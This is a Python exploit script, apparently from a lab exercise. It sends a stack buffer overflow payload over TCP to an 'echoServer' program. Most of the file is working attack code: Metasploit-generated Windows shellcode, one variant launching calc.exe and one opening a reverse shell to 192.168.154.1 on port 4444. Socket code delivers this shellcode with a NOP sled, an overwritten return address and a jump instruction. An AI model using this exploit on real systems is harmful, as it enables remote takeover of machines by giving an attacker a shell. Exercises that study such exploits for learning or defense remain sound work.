import sys, subprocess, struct, os, socket

# windows/exec - 220 bytes
# https://metasploit.com/
# Encoder: x86/shikata_ga_nai
# VERBOSE=false, PrependMigrate=false, EXITFUNC=process,
# CMD=calc.exe
buf =  b"\x89\xD4\x81\xEC\x80\x00\x00\x00"
buf += b"\xb8\x4e\xaf\x40\xae\xda\xd5\xd9\x74\x24\xf4\x5b\x31"
buf += b"\xc9\xb1\x31\x31\x43\x13\x03\x43\x13\x83\xeb\xb2\x4d"
buf += b"\xb5\x52\xa2\x10\x36\xab\x32\x75\xbe\x4e\x03\xb5\xa4"
buf += b"\x1b\x33\x05\xae\x4e\xbf\xee\xe2\x7a\x34\x82\x2a\x8c"
buf += b"\xfd\x29\x0d\xa3\xfe\x02\x6d\xa2\x7c\x59\xa2\x04\xbd"
buf += b"\x92\xb7\x45\xfa\xcf\x3a\x17\x53\x9b\xe9\x88\xd0\xd1"
buf += b"\x31\x22\xaa\xf4\x31\xd7\x7a\xf6\x10\x46\xf1\xa1\xb2"
buf += b"\x68\xd6\xd9\xfa\x72\x3b\xe7\xb5\x09\x8f\x93\x47\xd8"
buf += b"\xde\x5c\xeb\x25\xef\xae\xf5\x62\xd7\x50\x80\x9a\x24"
buf += b"\xec\x93\x58\x57\x2a\x11\x7b\xff\xb9\x81\xa7\xfe\x6e"
buf += b"\x57\x23\x0c\xda\x13\x6b\x10\xdd\xf0\x07\x2c\x56\xf7"
buf += b"\xc7\xa5\x2c\xdc\xc3\xee\xf7\x7d\x55\x4a\x59\x81\x85"
buf += b"\x35\x06\x27\xcd\xdb\x53\x5a\x8c\xb1\xa2\xe8\xaa\xf7"
buf += b"\xa5\xf2\xb4\xa7\xcd\xc3\x3f\x28\x89\xdb\x95\x0d\x65"
buf += b"\x96\xb4\x27\xee\x7f\x2d\x7a\x73\x80\x9b\xb8\x8a\x03"
buf += b"\x2e\x40\x69\x1b\x5b\x45\x35\x9b\xb7\x37\x26\x4e\xb8"
buf += b"\xe4\x47\x5b\xdb\x6b\xd4\x07\x32\x0e\x5c\xad\x4a"

# windows/shell_reverse_tcp - 324 bytes
# https://metasploit.com/
# VERBOSE=false, LHOST=192.168.154.1, LPORT=4444,
# ReverseAllowProxy=false, ReverseListenerThreaded=false,
# StagerRetryCount=10, StagerRetryWait=5,
# PrependMigrate=false, EXITFUNC=process, CreateSession=true
buf =  b"\x89\xD4\x81\xEC\x80\x00\x00\x00"
buf += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
buf += b"\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
buf += b"\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
buf += b"\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c"
buf += b"\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01"
buf += b"\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31"
buf += b"\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d"
buf += b"\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66"
buf += b"\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0"
buf += b"\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f"
buf += b"\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68"
buf += b"\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8"
buf += b"\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00"
buf += b"\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea\x0f"
buf += b"\xdf\xe0\xff\xd5\x97\x6a\x05\x68\xc0\xa8\x9a\x01\x68"
buf += b"\x02\x00\x11\x5c\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5"
buf += b"\x74\x61\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec"
buf += b"\x68\xf0\xb5\xa2\x56\xff\xd5\x68\x63\x6d\x64\x00\x89"
buf += b"\xe3\x57\x57\x57\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66"
buf += b"\xc7\x44\x24\x3c\x01\x01\x8d\x44\x24\x10\xc6\x00\x44"
buf += b"\x54\x50\x56\x56\x56\x46\x56\x4e\x56\x56\x53\x56\x68"
buf += b"\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30"
buf += b"\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68"
buf += b"\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0"
buf += b"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5"


#arg = buf + b"\x90" * (524-len(buf)) + b"\x80\xfc\x61"
#subprocess.call([r'vuln3.exe', arg]) 

USAGE = "Usage: echoServer.py server_addr server_port reverseShell_addr reverseShell_port"

def main():
	if len(sys.argv) != 5:
		print(USAGE)
		exit()
	server_addr, server_port, dst_addr, dst_port = sys.argv[1:]
	server_port = int(server_port)
	dst_port = int(dst_port)
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.connect((server_addr, server_port))
	sock.send(b"secret\n" + b"b" * 1017 + b"\x90" * (1048-len(buf)) + buf + b"\xf7\x55\x2a\x77"  + b"p"*4 + b"\xE9\xA4\xFD\xFF\xFF" + b"\xcc"*3)# + b"d"*4 + b"c"*16)
	#sock.send(b"secret\n" + b"a"*1017 + b"b"*1048 + b"d"*4 + b"c"*16)# + buf + b"a"*(2072-len(buf)) + b"d"*4)
	print(sock.recv(2048))

	#sock.send(b"a"*512)
	#sock.send(buf + b"a"*(1048-len(buf)) + b"d"*4)

if __name__=='__main__':
	main()
